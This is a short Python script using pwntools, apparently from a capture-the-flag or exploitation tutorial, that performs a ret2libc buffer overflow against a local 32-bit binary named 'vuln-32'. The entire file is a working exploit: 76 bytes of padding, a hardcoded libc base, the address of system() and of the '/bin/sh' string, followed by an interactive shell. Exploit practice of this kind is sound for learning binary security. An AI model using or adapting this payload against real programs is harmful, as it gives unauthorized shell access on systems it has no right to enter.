from pwn import *

p = process('./vuln-32')

libc_base = 0xf7d56000
system = libc_base + 0x00051c30
binsh = libc_base + 0x1afe43

payload = b'A' * 76         # The padding
payload += p32(system)      # Location of system
payload += p32(0x0)         # return pointer - not important once we get the shell
payload += p32(binsh)       # pointer to command: /bin/sh

p.clean()
p.sendline(payload)
p.interactive()
